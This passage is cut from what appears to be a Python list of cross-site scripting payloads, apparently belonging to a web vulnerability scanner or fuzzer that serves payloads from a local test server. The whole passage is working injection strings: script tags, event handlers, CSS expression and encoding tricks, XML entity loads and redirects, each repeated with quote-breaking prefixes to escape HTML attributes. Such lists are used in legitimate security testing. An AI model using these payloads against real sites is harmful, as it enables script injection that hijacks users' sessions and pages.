             '\'><a style="-o-link:\'javascript:alert(1)\';-o-link-source:current">X</a>',
             "<style>p[foo=bar{}*{-o-link:'javascript:alert(1)'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>",
             '"><style>p[foo=bar{}*{-o-link:\'javascript:alert(1)\'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>',
             "'><style>p[foo=bar{}*{-o-link:'javascript:alert(1)'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>",
             '<link rel=stylesheet href=data:,*%7bx:expression(write(1))%7d',
             '"><link rel=stylesheet href=data:,*%7bx:expression(write(1))%7d',
             "'><link rel=stylesheet href=data:,*%7bx:expression(write(1))%7d",
             '<style>@import "data:,*%7bx:expression(write(1))%7D";</style>',
             '"><style>@import "data:,*%7bx:expression(write(1))%7D";</style>',
             '\'><style>@import "data:,*%7bx:expression(write(1))%7D";</style>',
             '<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="alert(1);">XXX</a></a><a href="javascript:alert(2)">XXX</a>',
             '"><a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="alert(1);">XXX</a></a><a href="javascript:alert(2)">XXX</a>',
             '\'><a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="alert(1);">XXX</a></a><a href="javascript:alert(2)">XXX</a>',
             "<style>*[{}@import'test.css?]{color: green;}</style>X",
             '"><style>*[{}@import\'test.css?]{color: green;}</style>X',
             "'><style>*[{}@import'test.css?]{color: green;}</style>X",
             "* {-o-link:'javascript:alert(1)';-o-link-source: current;}",
             '<div style="font-family:\'foo[a];color:red;\';">XXX</div>',
             '"><div style="font-family:\'foo[a];color:red;\';">XXX</div>',
             '\'><div style="font-family:\'foo[a];color:red;\';">XXX</div>',
             '<div style="font-family:foo}color=red;">X', '"><div style="font-family:foo}color=red;">X',
             '\'><div style="font-family:foo}color=red;">XXX</div>', '"><div style="font-family:foo}color=red;">X',
             '"><div style="font-family:foo}color=red;">X', '\'><div style="font-family:foo}color=red;">XXX</div>',
             '\'><div style="font-family:foo}color=red;">X', '"><div style="font-family:foo}color=red;">X',
             '\'><div style="font-family:foo}color=red;">XXX</div>', '<div style="[a]color[b]:[c]red">XXX</div>',
             '"><div style="[a]color[b]:[c]red">XXX</div>', '\'><div style="[a]color[b]:[c]red">XXX</div>',
             '<div style="\\63&#9\\06f&#10\\0006c&#12\\00006F&#13\\R:\\000072 Ed;color\\0\\bla:yellow\\0\\bla;col\\0\\00 \\&#xA0or:blue;">XXX</div>',
             '"><div style="\\63&#9\\06f&#10\\0006c&#12\\00006F&#13\\R:\\000072 Ed;color\\0\\bla:yellow\\0\\bla;col\\0\\00 \\&#xA0or:blue;">XXX</div>',
             '\'><div style="\\63&#9\\06f&#10\\0006c&#12\\00006F&#13\\R:\\000072 Ed;color\\0\\bla:yellow\\0\\bla;col\\0\\00 \\&#xA0or:blue;">XXX</div>',
             '<// style=x:expression\\28write(1)\\29>', '"><// style=x:expression\\28write(1)\\29>',
             "'><// style=x:expression\\28write(1)\\29>", '<style>*{x:expression(write(1))}</style>',
             '"><style>*{x:expression(write(1))}</style>', "'><style>*{x:expression(write(1))}</style>",
             '<div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">X</div>',
             '"><div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">X</div>',
             '\'><div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">X</div>',
             '<div style="list-style:url(http://foo.f)\\20url(javascript:alert(1));">X</div>',
             '"><div style="list-style:url(http://foo.f)\\20url(javascript:alert(1));">X</div>',
             '\'><div style="list-style:url(http://foo.f)\\20url(javascript:alert(1));">X</div>',
             '<div id=d><div style="font-family:\'sans\\27\\2F\\2A\\22\\2A\\2F\\3B color\\3Ared\\3B\'">X</div></div> <script>with(document.getElementById("d"))innerHTML=innerHTML</script>',
             '"><div id=d><div style="font-family:\'sans\\27\\2F\\2A\\22\\2A\\2F\\3B color\\3Ared\\3B\'">X</div></div> <script>with(document.getElementById("d"))innerHTML=innerHTML</script>',
             '\'><div id=d><div style="font-family:\'sans\\27\\2F\\2A\\22\\2A\\2F\\3B color\\3Ared\\3B\'">X</div></div> <script>with(document.getElementById("d"))innerHTML=innerHTML</script>',
             '<div style="background:url(/f#[a]oo/;color:red/*/foo.jpg);">X</div>',
             '"><div style="background:url(/f#[a]oo/;color:red/*/foo.jpg);">X</div>',
             '\'><div style="background:url(/f#[a]oo/;color:red/*/foo.jpg);">X</div>',
             '<div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X',
             '"><div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X',
             '\'><div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X</div>',
             '"><div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X',
             '"><div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X',
             '\'><div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X</div>',
             '\'><div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X',
             '"><div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X',
             '\'><div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X</div>',
             '<x style="background:url(\'x[a];color:red;/*\')">XXX</x>',
             '"><x style="background:url(\'x[a];color:red;/*\')">XXX</x>',
             '\'><x style="background:url(\'x[a];color:red;/*\')">XXX</x>',
             '<script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>',
             '</ScrIpt><script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>',
             '"><script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>',
             '</ScrIpt><script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>',
             "'><script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>",
             '</ScrIpt><script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>',
             '<script>({0:#0=alert/#0#/#0#(1)})</script>', '</ScrIpt><script>({0:#0=alert/#0#/#0#(1)})</script>',
             '"><script>({0:#0=alert/#0#/#0#(1)})</script>', '</ScrIpt><script>({0:#0=alert/#0#/#0#(1)})</script>',
             "'><script>({0:#0=alert/#0#/#0#(1)})</script>", '</ScrIpt><script>({0:#0=alert/#0#/#0#(1)})</script>',
             "<script>ReferenceError.prototype.__defineGetter__('name', function(){alert(1)}),x</script>",
             "</ScrIpt><script>ReferenceError.prototype.__defineGetter__('name', function(){alert(1)}),x</script>",
             '"><script>ReferenceError.prototype.__defineGetter__(\'name\', function(){alert(1)}),x</script>',
             "</ScrIpt><script>ReferenceError.prototype.__defineGetter__('name', function(){alert(1)}),x</script>",
             "'><script>ReferenceError.prototype.__defineGetter__('name', function(){alert(1)}),x</script>",
             "</ScrIpt><script>ReferenceError.prototype.__defineGetter__('name', function(){alert(1)}),x</script>",
             "<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script>",
             "</ScrIpt><script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script>",
             '"><script>Object.__noSuchMethod__ = Function,[{}][0].constructor._(\'alert(1)\')()</script>',
             "</ScrIpt><script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script>",
             "'><script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script>",
             "</ScrIpt><script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script>",
             "<script>history.pushState(0,0,'/i/am/somewhere_else');</script>",
             "</ScrIpt><script>history.pushState(0,0,'/i/am/somewhere_else');</script>",
             '"><script>history.pushState(0,0,\'/i/am/somewhere_else\');</script>',
             "</ScrIpt><script>history.pushState(0,0,'/i/am/somewhere_else');</script>",
             "'><script>history.pushState(0,0,'/i/am/somewhere_else');</script>",
             "</ScrIpt><script>history.pushState(0,0,'/i/am/somewhere_else');</script>",
             '<script src="#">{alert(1)}</script>;1', '"><script src="#">{alert(1)}</script>;1',
             '\'><script src="#">{alert(1)}</script>;1',
             '+ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);',
             '<b><script<b></b><alert(1)</script </b></b>', '"><b><script<b></b><alert(1)</script </b></b>',
             "'><b><script<b></b><alert(1)</script </b></b>", '<script<{alert(1)}/></script </>',
             '"><script<{alert(1)}/></script </>', "'><script<{alert(1)}/></script </>",
             '0?<script>Worker("#").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts(\'data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk\'))',
             "<script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>",
             "</ScrIpt><script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>",
             '"><script>crypto.generateCRMFRequest(\'CN=0\',0,0,null,\'alert(1)\',384,null,\'rsa-dual-use\')</script>',
             "</ScrIpt><script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>",
             "'><script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>",
             "</ScrIpt><script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>",
             "<script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>",
             "</ScrIpt><script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>",
             '"><script>[{\'a\':Object.prototype.__defineSetter__(\'b\',function(){alert(arguments[0])}),\'b\':[\'secret\']}]</script>',
             "</ScrIpt><script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>",
             "'><script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>",
             "</ScrIpt><script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>",
             '<svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(1)"></g></svg',
             '"><svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(1)"></g></svg',
             '\'><svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(1)"></g></svg',
             '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script>', '</ScrIpt><script>alert(1)</script>',
             '"><script>alert(1)</script>', '</ScrIpt><script>alert(1)</script>', "'><script>alert(1)</script>",
             '</ScrIpt><script>alert(1)</script></svg>',
             '<svg onload="javascript:alert(1)" xmlns="http://www.w3.org/2000/svg"></svg>',
             '"><svg onload="javascript:alert(1)" xmlns="http://www.w3.org/2000/svg"></svg>',
             '\'><svg onload="javascript:alert(1)" xmlns="http://www.w3.org/2000/svg"></svg>',
             '<iframe src="data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03"></iframe>',
             '"><iframe src="data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03"></iframe>',
             '\'><iframe src="data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03"></iframe>',
             '<svg><style>&lt;img/src=x onerror=alert(1)// </b>', '"><svg><style>&lt;img/src=x onerror=alert(1)// </b>',
             "'><svg><style>&lt;img/src=x onerror=alert(1)// </b>",
             '<?xml-stylesheet href="javascript:alert(1)"?><root/>',
             '"><?xml-stylesheet href="javascript:alert(1)"?><root/>',
             '\'><?xml-stylesheet href="javascript:alert(1)"?><root/>',
             '<script xmlns="http://www.w3.org/1999/xhtml">&#x61;l&#x65;rt&#40;1)</script>',
             '"><script xmlns="http://www.w3.org/1999/xhtml">&#x61;l&#x65;rt&#40;1)</script>',
             '\'><script xmlns="http://www.w3.org/1999/xhtml">&#x61;l&#x65;rt&#40;1)</script>',
             '<!DOCTYPE x[<!ENTITY x SYSTEM "http://127.0.0.1:3555/xss_serve_payloads/X.html">]><y>&x;</y>',
             '"><!DOCTYPE x[<!ENTITY x SYSTEM "http://127.0.0.1:3555/xss_serve_payloads/X.html">]><y>&x;</y>',
             '\'><!DOCTYPE x[<!ENTITY x SYSTEM "http://127.0.0.1:3555/xss_serve_payloads/X.html">]><y>&x;</y>',
             '<script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script>',
             '"><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script>',
             '\'><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script>',
             '<?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?>',
             '"><?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?>',
             '\'><?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?>',
             '<?xml-stylesheet type="text/xsl" href="#" ?> <stylesheet xmlns="http://www.w3.org/TR/WD-xsl"> <template match="/"> <eval>new ActiveXObject(&apos;htmlfile&apos;).parentWindow.alert(1)</eval> <if expr="new ActiveXObject(\'htmlfile\').parentWindow.alert(2)"></if> </template> </stylesheet>',
             '"><?xml-stylesheet type="text/xsl" href="#" ?> <stylesheet xmlns="http://www.w3.org/TR/WD-xsl"> <template match="/"> <eval>new ActiveXObject(&apos;htmlfile&apos;).parentWindow.alert(1)</eval> <if expr="new ActiveXObject(\'htmlfile\').parentWindow.alert(2)"></if> </template> </stylesheet>',
             '\'><?xml-stylesheet type="text/xsl" href="#" ?> <stylesheet xmlns="http://www.w3.org/TR/WD-xsl"> <template match="/"> <eval>new ActiveXObject(&apos;htmlfile&apos;).parentWindow.alert(1)</eval> <if expr="new ActiveXObject(\'htmlfile\').parentWindow.alert(2)"></if> </template> </stylesheet>',
             '<!ENTITY x "&#x3C;html:img&#x20;src=\'x\'&#x20;xmlns:html=\'http://www.w3.org/1999/xhtml\'&#x20;onerror=\'alert(1)\'/&#x3E;">',
             '"><!ENTITY x "&#x3C;html:img&#x20;src=\'x\'&#x20;xmlns:html=\'http://www.w3.org/1999/xhtml\'&#x20;onerror=\'alert(1)\'/&#x3E;">',
             '\'><!ENTITY x "&#x3C;html:img&#x20;src=\'x\'&#x20;xmlns:html=\'http://www.w3.org/1999/xhtml\'&#x20;onerror=\'alert(1)\'/&#x3E;">',
             'X<x style=`behavior:url(#default#time2)` onbegin=`write(1)` >',
             '1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=alert(1)&gt;`>',
             '1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=alert(1)&gt;>',
             '1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=test.vml#X></vmlframe>',
             '<xml> <rect style="height:100%;width:100%" id="X" onmouseover="alert(1)" strokecolor="white" strokeweight="2000px" filled="false" /> </xml>',
             '"><xml> <rect style="height:100%;width:100%" id="X" onmouseover="alert(1)" strokecolor="white" strokeweight="2000px" filled="false" /> </xml>',
             '\'><xml> <rect style="height:100%;width:100%" id="X" onmouseover="alert(1)" strokecolor="white" strokeweight="2000px" filled="false" /> </xml>',
             '1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>',
             '<a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(1)">XXX</a>',
             '"><a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(1)">XXX</a>',
             '\'><a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(1)">XXX</a>',
             '<x style="behavior:url(test.sct)">', '"><x style="behavior:url(test.sct)">',
             '\'><x style="behavior:url(test.sct)">',
             '<SCRIPTLET> <IMPLEMENTS Type="Behavior"></IMPLEMENTS><SCRIPT Language="javascript">alert(1)</SCRIPT></SCRIPTLET>',
             '"><SCRIPTLET> <IMPLEMENTS Type="Behavior"></IMPLEMENTS><SCRIPT Language="javascript">alert(1)</SCRIPT></SCRIPTLET>',
             '\'><SCRIPTLET> <IMPLEMENTS Type="Behavior"></IMPLEMENTS><SCRIPT Language="javascript">alert(1)</SCRIPT></SCRIPTLET>',
             '<xml id="X" src="test.htc"></xml><label dataformatas="html" datasrc="#X" datafld="payload"></label>',
             '"><xml id="X" src="test.htc"></xml><label dataformatas="html" datasrc="#X" datafld="payload"></label>',
             '\'><xml id="X" src="test.htc"></xml><label dataformatas="html" datasrc="#X" datafld="payload"></label>',
             '<?xml version="1.0"?> x><payload><![CDATA[<img src=x onerror=alert(1)>]]></payload></x>',
             '"><?xml version="1.0"?> x><payload><![CDATA[<img src=x onerror=alert(1)>]]></payload></x>',
             '\'><?xml version="1.0"?> x><payload><![CDATA[<img src=x onerror=alert(1)>]]></payload></x>',
             '<?xml-stylesheet type="text/css"?><root style="x:expression(write(1))"/>',
             '"><?xml-stylesheet type="text/css"?><root style="x:expression(write(1))"/>',
             '\'><?xml-stylesheet type="text/css"?><root style="x:expression(write(1))"/>',
             'object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object> <object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="alert(1)" style="behavior:url(#x);"><param name=postdomevents /></object>',
             'class X {public static function main() { flash.Lib.getURL(new flash.net.URLRequest(flash.Lib._root.url||"javascript:alert(1)"),flash.Lib._root.name||"_top"); }}',
             '<div id="div1"><input value="``onmouseover=alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>',
             '"><div id="div1"><input value="``onmouseover=alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>',
             '\'><div id="div1"><input value="``onmouseover=alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>',
             '<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>',
             '"><body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>',
             "'><body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>",
             'X<form id=test onforminput=javascript:alert(1)><input></form>',
             'X<form id=test><input></form><button form=test onformchange==javascript:alert(1)>X',
             '<input onblur=write(1) autofocus><input autofocus>',
             '"><input onblur=write(1) autofocus><input autofocus>',
             "'><input onblur=write(1) autofocus><input autofocus>", '<video onerror="javascript:alert(1)"><source>',
             '"><video onerror="javascript:alert(1)"><source>', '\'><video onerror="javascript:alert(1)"><source>',
             '<q/oncut=open()>', '"><q/oncut=open()>', "'><q/oncut=open()>", '<marquee<marquee/onstart=confirm(1)>',
             '"><marquee/onstart=confirm(1)>', "'><marquee/onstart=confirm(1)>/onstart=confirm(1)>",
             '<body language=vbsonload=alert-1', '"><body language=vbsonload=alert-1',
             "'><body language=vbsonload=alert-1",
             '<command onmouseover="\\x6A\\x61\\x76\\x61\\x53\\x43\\x52\\x49\\x50\\x54\\x26\\x63\\x6F\\x6C\\x6F\\x6E\\x3B\\x63\\x6F\\x6E\\x66\\x69\\x72\\x6D\\x26\\x6C\\x70\\x61\\x72\\x3B\\x31\\x26\\x72\\x70\\x61\\x72\\x3B">Save</command>',
             '"><command onmouseover="\\x6A\\x61\\x76\\x61\\x53\\x43\\x52\\x49\\x50\\x54\\x26\\x63\\x6F\\x6C\\x6F\\x6E\\x3B\\x63\\x6F\\x6E\\x66\\x69\\x72\\x6D\\x26\\x6C\\x70\\x61\\x72\\x3B\\x31\\x26\\x72\\x70\\x61\\x72\\x3B">Save</command>',
             '\'><command onmouseover="\\x6A\\x61\\x76\\x61\\x53\\x43\\x52\\x49\\x50\\x54\\x26\\x63\\x6F\\x6C\\x6F\\x6E\\x3B\\x63\\x6F\\x6E\\x66\\x69\\x72\\x6D\\x26\\x6C\\x70\\x61\\x72\\x3B\\x31\\x26\\x72\\x70\\x61\\x72\\x3B">Save</command>',
             '<q/oncut=alert(1)>', '"><q/oncut=alert(1)>', "'><q/oncut=alert(1)>", 'eval("aler"+(!![]+[])[+[]])("X")',
             'window["alert"]("X")', "this['ale'+(!![]+[])[-~[]]+(!![]+[])[+[]]]()",
             '< %3C &lt &lt; &LT &LT; &#60 &#060 &#0060 &#00060 &#000060 &#0000060 &#60; &#060; &#0060; &#00060; &#000060; &#0000060; &#x3c &#x03c &#x003c &#x0003c &#x00003c &#x000003c &#x3c; &#x03c; &#x003c; &#x0003c; &#x00003c; &#x000003c; &#X3c &#X03c &#X003c &#X0003c &#X00003c &#X000003c &#X3c; &#X03c; &#X003c; &#X0003c; &#X00003c; &#X000003c; &#x3C &#x03C &#x003C &#x0003C &#x00003C &#x000003C &#x3C; &#x03C; &#x003C; &#x0003C; &#x00003C; &#x000003C; &#X3C &#X03C &#X003C &#X0003C &#X00003C &#X000003C &#X3C; &#X03C; &#X003C; &#X0003C; &#X00003C; &#X000003C; \\x3c \\x3C \\u003c \\u003C',
             '">< %3C &lt &lt; &LT &LT; &#60 &#060 &#0060 &#00060 &#000060 &#0000060 &#60; &#060; &#0060; &#00060; &#000060; &#0000060; &#x3c &#x03c &#x003c &#x0003c &#x00003c &#x000003c &#x3c; &#x03c; &#x003c; &#x0003c; &#x00003c; &#x000003c; &#X3c &#X03c &#X003c &#X0003c &#X00003c &#X000003c &#X3c; &#X03c; &#X003c; &#X0003c; &#X00003c; &#X000003c; &#x3C &#x03C &#x003C &#x0003C &#x00003C &#x000003C &#x3C; &#x03C; &#x003C; &#x0003C; &#x00003C; &#x000003C; &#X3C &#X03C &#X003C &#X0003C &#X00003C &#X000003C &#X3C; &#X03C; &#X003C; &#X0003C; &#X00003C; &#X000003C; \\x3c \\x3C \\u003c \\u003C',
             "'>< %3C &lt &lt; &LT &LT; &#60 &#060 &#0060 &#00060 &#000060 &#0000060 &#60; &#060; &#0060; &#00060; &#000060; &#0000060; &#x3c &#x03c &#x003c &#x0003c &#x00003c &#x000003c &#x3c; &#x03c; &#x003c; &#x0003c; &#x00003c; &#x000003c; &#X3c &#X03c &#X003c &#X0003c &#X00003c &#X000003c &#X3c; &#X03c; &#X003c; &#X0003c; &#X00003c; &#X000003c; &#x3C &#x03C &#x003C &#x0003C &#x00003C &#x000003C &#x3C; &#x03C; &#x003C; &#x0003C; &#x00003C; &#x000003C; &#X3C &#X03C &#X003C &#X0003C &#X00003C &#X000003C &#X3C; &#X03C; &#X003C; &#X0003C; &#X00003C; &#X000003C; \\x3c \\x3C \\u003c \\u003C",
             '<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">X</A>',
             '"><A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">X</A>',
             '\'><A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">X</A>',
             '<A HREF="http://1113982867/">X</A>', '"><A HREF="http://1113982867/">X</A>',
             '\'><A HREF="http://1113982867/">X</A>', '<A HREF="h tt\tp://6&#09;6.000146.0x7.147/">X</A>',
             '"><A HREF="h tt\tp://6&#09;6.000146.0x7.147/">X</A>',
             '\'><A HREF="h tt\tp://6&#09;6.000146.0x7.147/">X</A>', '<A HREF="//google">X</A>',
             '"><A HREF="//google">X</A>', '\'><A HREF="//google">X</A>',
             '<A HREF="http://127.0.0.1:3555/xss_serve_payloads/X.html@google">X</A',
             '"><A HREF="http://127.0.0.1:3555/xss_serve_payloads/X.html@google">X</A',
             '\'><A HREF="http://127.0.0.1:3555/xss_serve_payloads/X.html@google">X</A',
             '<A HREF="http://google:127.0.0.1:3555/xss_serve_payloads/X.html">X</A>',
             '"><A HREF="http://google:127.0.0.1:3555/xss_serve_payloads/X.html">X</A>',
             '\'><A HREF="http://google:127.0.0.1:3555/xss_serve_payloads/X.html">X</A>',
             'document.write(\'<iframe src="http://127.0.0.1:3555/xss_serve_payloads/X.html" style="border: 0; width: 100%; height: 100%"></iframe>\')',
             'http://%22%20onerror=%22alert%281%29;//',
             "document.location='http://127.0.0.1:3555/xss_serve_payloads/X.html'",
             'document.location="http://127.0.0.1:3555/xss_serve_payloads/X.html"', '\\"><script>alert(/X/)<script>',
             ';alert%28String.fromCharCode%2875,67,70%29%29//\\%27;alert%28String.fromCharCode%2875,67,70%29%29//%22;alert%28String.fromCharCode%2875,67,70%29%29//\\%22;alert%28String.fromCharCode%2875,67,70%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2875,67,70%29%29%3C/SCRIPT%3E',
             '<input onfocus=write(1) autofocus>', '"><input onfocus=write(1) autofocus>',
             "'><input onfocus=write(1) autofocus>", '<video poster=javascript:alert(1)//></video>',
             '"><video poster=javascript:alert(1)//></video>', "'><video poster=javascript:alert(1)//></video>",
             '<video poster=prompt(1)//></video>', '"><video poster=prompt(1)//></video>',
             "'><video poster=prompt(1)//></video>",
             '<body onscroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>',
             '"><body onscroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>',
             "'><body onscroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>",
             '<body onscroll=prompt(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>',
             '"><body onscroll=prompt(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>',
             "'><body onscroll=prompt(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>",
             '<form id=test onforminput=prompt(1)><input></form><button form=test onformchange=prompt(2)>X</button>',
             '"><form id=test onforminput=prompt(1)><input></form><button form=test onformchange=prompt(2)>X</button>',
             "'><form id=test onforminput=prompt(1)><input></form><button form=test onformchange=prompt(2)>X</button>",
             '<video><source onerror="alert(1)">', '"><video><source onerror="alert(1)">',
             '\'><video><source onerror="alert(1)">', '<video><source onerror="prompt(1)">',
             '"><video><source onerror="prompt(1)">', '\'><video><source onerror="prompt(1)">',
             '<video><source onerror="prompt(1)">', '"><video><source onerror="prompt(1)">',
             '\'><video><source onerror="prompt(1)"></source></video>',
             '"><video><source onerror="prompt(1)"></source></video>',
             '\'><video><source onerror="prompt(1)"></source></video>',
             '<form><button formaction="javascript:alert(1)">X</button>',
             '"><form><button formaction="javascript:alert(1)">X</button>',
             '\'><form><button formaction="javascript:alert(1)">X</button>', '<body oninput=alert(1)><input autofocus>',
             '"><body oninput=alert(1)><input autofocus>', "'><body oninput=alert(1)><input autofocus>",
             '<body oninput=prompt(1)><input autofocus>', '"><body oninput=prompt(1)><input autofocus>',
             "'><body oninput=prompt(1)><input autofocus>", '<frameset onload=prompt(1)>',
             '"><frameset onload=prompt(1)>', "'><frameset onload=prompt(1)>",
             '<comment><img src="</comment><img src=x onerror=alert(1)//">',
             '"><comment><img src="</comment><img src=x onerror=alert(1)//">',
             '\'><comment><img src="</comment><img src=x onerror=alert(1)//">',
             '<comment><img src="</comment><img src=x onerror=prompt(1)//">',
             '"><comment><img src="</comment><img src=x onerror=prompt(1)//">',
             '\'><comment><img src="</comment><img src=x onerror=prompt(1)//">',
             '<style><img src="</style><img src=x onerror=prompt(1)//">',
             '"><style><img src="</style><img src=x onerror=prompt(1)//">',
             '\'><style><img src="</style><img src=x onerror=prompt(1)//">',
             '<SCRIPT FOR=document EVENT=onreadystatechange>prompt(1)</SCRIPT>',
             '"><SCRIPT FOR=document EVENT=onreadystatechange>prompt(1)</SCRIPT>',
             "'><SCRIPT FOR=document EVENT=onreadystatechange>prompt(1)</SCRIPT>",
             '<div style=width:1px;filter:glow onfilterchange=prompt(1)>x</div>',
             '"><div style=width:1px;filter:glow onfilterchange=prompt(1)>x</div>',
             "'><div style=width:1px;filter:glow onfilterchange=prompt(1)>x</div>",
             '<img[a][b]src=x[d]onerror[c]=[e]"prompt(1)">', '"><img[a][b]src=x[d]onerror[c]=[e]"prompt(1)">',
             '\'><img[a][b]src=x[d]onerror[c]=[e]"prompt(1)">', "'-prompt(1)'", "'-alert(1)-'",
             '\';alert(String.fromCharCode(75,67,70))//\';alert(String.fromCharCode(75,67,70))//";',
             'alert(String.fromCharCode(75,67,70))//";alert(String.fromCharCode(75,67,70))//--></SCRIPT>">\'><SCRIPT>alert(String.fromCharCode(75,67,70))</SCRIPT>',
